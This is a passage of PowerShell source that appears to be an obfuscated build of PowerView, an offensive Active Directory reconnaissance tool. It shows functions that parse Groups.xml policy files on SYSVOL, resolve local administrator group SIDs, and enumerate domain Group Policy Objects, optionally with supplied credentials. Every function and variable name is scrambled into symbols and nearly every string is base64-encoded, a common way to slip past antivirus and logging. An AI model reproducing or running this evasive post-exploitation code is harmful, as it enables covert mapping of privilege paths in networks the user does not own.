                    ${_____/=\_/=====\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))] = ${__/=\/======\/=\/}
                    ${_____/=\_/=====\_}
                }
            }
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAcAB0AFQAbQBwAGwAXQAgAEUAcgByAG8AcgAgAHAAYQByAHMAaQBuAGcAIAAkAHsAXwBfAC8APQBcAC8APQA9AD0APQA9AD0AXAAvAD0AXAAvAH0AIAA6ACAAJABfAA==')))
        }
    }
    END {
        ${__/\/=\_/==\/\/==}.Keys | % { _______/\__/=\/=\/ -Path $_ }
    }
}
function __/=\_/\___/\/\___ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $GroupsXMLPath,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${__/\/=\_/==\/\/==} = @{}
    }
    PROCESS {
        try {
            if (($GroupsXMLPath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${__/\/\_/\_/\/=\/=} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not ${__/\/=\_/==\/\/==}[${__/\/\_/\_/\/=\/=}]) {
                    ___/=\_/\_/=\/\_/\ -Path ${__/\/\_/\_/\/=\/=} -Credential $Credential
                    ${__/\/=\_/==\/\/==}[${__/\/\_/\_/\/=\/=}] = $True
                }
            }
            [XML]${/==\/===\/=\/=\__} = gc -Path $GroupsXMLPath -ErrorAction Stop
            ${/==\/===\/=\/=\__} | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAEcAcgBvAHUAcAA='))) | select -ExpandProperty node | % {
                ${___/===\/=\___/\/} = $_.Properties.groupName
                ${/=\/=\_/\___/===\} = $_.Properties.groupSid
                if (-not ${/=\/=\_/\___/===\}) {
                    if (${___/===\/=\___/\/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                        ${/=\/=\_/\___/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                    }
                    elseif (${___/===\/=\___/\/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                        ${/=\/=\_/\___/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                    }
                    elseif (${___/===\/=\___/\/} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                        ${/=\/=\_/\___/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                    }
                    else {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                            ${/=\/=\_/\___/===\} = ___/===\/\/\_/\/\_ -/=\_/\/\/=\__/\_/ ${___/===\/=\___/\/} -Credential $Credential
                        }
                        else {
                            ${/=\/=\_/\___/===\} = ___/===\/\/\_/\/\_ -/=\_/\/\/=\__/\_/ ${___/===\/=\___/\/}
                        }
                    }
                }
                ${__/====\___/==\_/} = $_.Properties.members | select -ExpandProperty Member | ? { $_.action -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAEQA'))) } | % {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }
                if (${__/====\___/==\_/}) {
                    if ($_.filters) {
                        ${_/\/\/==\__/=\/==} = $_.filters.GetEnumerator() | % {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        ${_/\/\/==\__/=\/==} = $Null
                    }
                    if (${__/====\___/==\_/} -isnot [System.Array]) { ${__/====\___/==\_/} = @(${__/====\___/==\_/}) }
                    ${/=\__/\/======\_/} = New-Object PSObject
                    ${/=\__/\/======\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) $TargetGroupsXMLPath
                    ${/=\__/\/======\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIAcwA='))) ${_/\/\/==\__/=\/==}
                    ${/=\__/\/======\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${___/===\/=\___/\/}
                    ${/=\__/\/======\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) ${/=\/=\_/\___/===\}
                    ${/=\__/\/======\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) $Null
                    ${/=\__/\/======\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) ${__/====\___/==\_/}
                    ${/=\__/\/======\_/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAAcwBYAE0ATAA='))))
                    ${/=\__/\/======\_/}
                }
            }
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEcAcgBvAHUAcABzAFgATQBMAF0AIABFAHIAcgBvAHIAIABwAGEAcgBzAGkAbgBnACAAJABUAGEAcgBnAGUAdABHAHIAbwB1AHAAcwBYAE0ATABQAGEAdABoACAAOgAgACQAXwA=')))
        }
    }
    END {
        ${__/\/=\_/==\/\/==}.Keys | % { _______/\__/=\/=\/ -Path $_ }
    }
}
function _/=\/\__/\/\/=\_/\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${_____/=\/\/\/\/\/\},
        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/=\___/\_/=\____} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
    }
    PROCESS {
        if (${_/=\___/\_/=\____}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) {
                ${_____/==\/\/\___/} = @()
                if (${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
                    ${/\______/=\/=\/=\} = ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
                }
                ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
                ${___/\/\/==\_/\__/} = $Null
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
                    ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${_____/=\/\/\/\/\/\}
                    ${__/\__/\/\_/=====} = _/==\/\/\_______/\ @/=\___/=\__/=\/\/ -FindOne | select -First 1
                    if(-not ${__/\__/\/\_/=====}) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABDAG8AbQBwAHUAdABlAHIAIAAnACQAewBfAF8AXwBfAF8ALwA9AFwALwBcAC8AXAAvAFwALwBcAC8AXAB9ACcAIABuAG8AdAAgAGYAbwB1AG4AZAAhAA==')))
                    }
                    ${/=\/\/\_/=\/\/=\_} = ${__/\__/\/\_/=====}.distinguishedname
                    ${___/\/\/==\_/\__/} = ${__/\__/\/\_/=====}.dnshostname
                }
                else {
                    ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity
                    ${__/====\_/==\_/=\/} = __/\__/\/======\_/ @/=\___/=\__/=\/\/ -FindOne | select -First 1
                    if(-not ${__/====\_/==\_/=\/}) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAHMAZQByACAAJwAkAFUAcwBlAHIASQBkAGUAbgB0AGkAdAB5ACcAIABuAG8AdAAgAGYAbwB1AG4AZAAhAA==')))
                    }
                    ${/=\/\/\_/=\/\/=\_} = ${__/====\_/==\_/=\/}.distinguishedname
                }
                ${/=\__/===\/\/==\_} = @()
                ${/=\__/===\/\/==\_} += ${/=\/\/\_/=\/\/=\_}.split(',') | % {
                    if($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))) {
                        ${/=\/\/\_/=\/\/=\_}.SubString(${/=\/\/\_/=\/\/=\_}.IndexOf("$($_),"))
                    }
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABvAGIAagBlAGMAdAAgAE8AVQBzADoAIAAkAHsALwA9AFwAXwBfAC8APQA9AD0AXAAvAFwALwA9AD0AXABfAH0A')))
                if (${/=\__/===\/\/==\_}) {
                    ${/=\___/=\__/=\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                    ${__/\__/=\/\/\__/=} = $False
                    ForEach(${_______/==\_/===\} in ${/=\__/===\/\/==\_}) {
                        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${_______/==\_/===\}
                        ${_____/==\/\/\___/} += ___/\/==\_/=\/==== @/=\___/=\__/=\/\/ | % {
                            if ($_.gplink) {
                                $_.gplink.split('][') | % {
                                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                        ${__/=\__/\____/=\_} = $_.split(';')
                                        ${/=\/==\/\/==\____} = ${__/=\__/\____/=\_}[0]
                                        ${/====\/\_/===\___} = ${__/=\__/\____/=\_}[1]
                                        if (${__/\__/=\/\/\__/=}) {
                                            if (${/====\/\_/===\___} -eq 2) {
                                                ${/=\/==\/\/==\____}
                                            }
                                        }
                                        else {
                                            ${/=\/==\/\/==\____}
                                        }
                                    }
                                }
                            }
                            if ($_.gpoptions -eq 1) {
                                ${__/\__/=\/\/\__/=} = $True
                            }
                        }
                    }
                }
                if (${___/\/\/==\_/\__/}) {
                    ${___/\/\/\__/=\/\_} = (____/\/\_____/\_/= -____/=\/=\_/=\/\/ ${___/\/\/==\_/\__/}).SiteName
                    if(${___/\/\/\__/=\/\_} -and (${___/\/\/\__/=\/\_} -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACoA'))))) {
                        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${___/\/\/\__/=\/\_}
                        ${_____/==\/\/\___/} += __/=\_/=\_____/=\_ @/=\___/=\__/=\/\/ | % {
                            if($_.gplink) {
                                $_.gplink.split('][') | % {
                                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }
                ${___/=\_/======\__} = ${/=\/\/\_/=\/\/=\_}.SubString(${/=\/\/\_/=\/\/=\_}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A')))))
                ${/=\___/=\__/=\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))))
                ${/=\___/=\__/=\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABjAGwAYQBzAHMAPQBkAG8AbQBhAGkAbgApACgAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwA9AD0APQA9AD0APQBcAF8AXwB9ACkA')))
                ${_____/==\/\/\___/} += ___/\___/\__/===\/ @/=\___/=\__/=\/\/ | % {
                    if($_.gplink) {
                        $_.gplink.split('][') | % {
                            if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABHAFAATwBBAGQAcwBQAGEAdABoAHMAOgAgACQAewBfAF8AXwBfAF8ALwA9AD0AXAAvAFwALwBcAF8AXwBfAC8AfQA=')))
                if (${/\______/=\/=\/=\}) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = ${/\______/=\/=\/=\} }
                else { ${/=\___/=\__/=\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))) }
                ${/=\___/=\__/=\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))))
                ${_____/==\/\/\___/} | ? {$_ -and ($_ -ne '')} | % {
                    ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $_
                    ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBnAHIAbwB1AHAAUABvAGwAaQBjAHkAQwBvAG4AdABhAGkAbgBlAHIAKQA=')))
                    ___/\___/\__/===\/ @/=\___/=\__/=\/\/ | % {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                            $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwAuAFIAYQB3AA=='))))
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwA='))))
                        }
                        $_
                    }
                }
            }
            else {
                ${_____/\_/\/=\/=\_} = ''
                $Filter = ''
                $Identity | ? {$_} | % {
                    ${___/=\_/\/\__/===} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwB8AF4AQwBOAD0ALgAqAA==')))) {
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            ${/====\/==\_/=====} = ${___/=\_/\/\__/===}.SubString(${___/=\_/\/\__/===}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsALwA9AD0APQA9AFwALwA9AD0AXABfAC8APQA9AD0APQA9AH0AJwAgAGYAcgBvAG0AIAAnACQAewBfAF8AXwAvAD0AXABfAC8AXAAvAFwAXwBfAC8APQA9AD0AfQAnAA==')))
                            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${/====\/==\_/=====}
                            ${_/=\___/\_/=\____} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                            if (-not ${_/=\___/\_/=\____}) {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewAvAD0APQA9AD0AXAAvAD0APQBcAF8ALwA9AD0APQA9AD0AfQAnAA==')))
                            }
                        }
                    }
                    elseif (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAuACoAfQA=')))) {
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkA')))
                    }
                    else {
                        try {
                            ${_/==\/\_/==\_/\/=} = (-Join (([Guid]${___/=\_/\/\__/===}).ToByteArray() | % {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                            ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AD0AXAAvAFwAXwAvAD0APQBcAF8ALwBcAC8APQB9ACkA')))
                        }
                        catch {
                            ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                        }
                    }
                }
                if (${_____/\_/\/=\/=\_} -and (${_____/\_/\/=\/=\_}.Trim() -ne '') ) {
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8AXwBfAF8ALwBcAF8ALwBcAC8APQBcAC8APQBcAF8AfQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
                ${_/=\___/\_/=\____}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAJABGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-DomainGPO] filter string: $(${_/=\___/\_/=\____}.filter)"
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/==\_/=\____/===\} = ${_/=\___/\_/=\____}.FindOne() }
                else { ${/==\_/=\____/===\} = ${_/=\___/\_/=\____}.FindAll() }
                ${/==\_/=\____/===\} | ? {$_} | % {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ${/===\/\_/\__/==\/} = $_
                        ${/===\/\_/\__/==\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwAuAFIAYQB3AA=='))))
                    }
                    else {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] -and ($SearchBase -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A'))))) {
                            ${/===\/\_/\__/==\/} = ____/=\__/\/=\__/= -Properties $_.Properties
                            try {
                                ${/=\/==\/\/==\____} = ${/===\/\_/\__/==\/}.distinguishedname
                                ${_/\_/\_/\/===\/==} = ${/=\/==\/\/==\____}.SubString(${/=\/==\/\/==\____}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                                ${_/\_/\/\_/=\___/=} = "\\${_/\_/\_/\/===\/==}\SysVol\${_/\_/\_/\/===\/==}\Policies\$(${/===\/\_/\__/==\/}.cn)"
